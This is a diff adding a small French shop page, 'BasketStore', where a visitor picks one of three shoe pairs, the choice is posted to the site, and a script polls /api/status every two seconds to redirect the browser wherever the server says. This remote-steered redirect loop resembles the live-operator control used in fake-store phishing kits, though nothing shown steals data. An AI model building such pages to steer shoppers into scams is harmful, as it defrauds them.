@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Produit - BasketStore</title>
+</head>
+<body>
+<h1>👟 Choisissez votre paire</h1>
+<button onclick="choosePair('Paire A')">Paire A</button>
+<button onclick="choosePair('Paire B')">Paire B</button>
+<button onclick="choosePair('Paire C')">Paire C</button>
+
+<script>
+function choosePair(pair){
+  fetch('/api/pair', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({pair})
+  }).then(()=>window.location.href='/delivery.html');
+}
+
+async function checkStatus() {
+  try {
+    const res = await fetch('/api/status');
+    const data = await res.json();
+    if(data.redirect && window.location.pathname !== data.redirect){
+      window.location.href = data.redirect;
+    }
+    setTimeout(checkStatus, 2000);
+  } catch(e){ setTimeout(checkStatus, 2000); }
+}
+checkStatus();
+</script>
+</body>
+</html>
